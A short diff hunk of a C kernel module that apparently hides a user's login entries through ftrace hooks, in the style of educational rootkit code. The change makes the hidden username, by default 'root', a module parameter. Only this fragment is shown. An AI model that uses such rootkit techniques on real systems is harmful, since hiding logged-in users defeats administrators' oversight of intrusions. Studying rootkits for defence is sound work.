@@ -8,7 +8,12 @@
 #include "utmp.h"
 #include "ftrace_helper.h"
 
-#define HIDDEN_USER "root"
+/*
+ * The username "root" can be a default
+ * and hard coded value.
+ */
+static char *HIDDEN_USER = "root";
+module_param(HIDDEN_USER, charp, S_IRUGO);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("TheXcellerator");
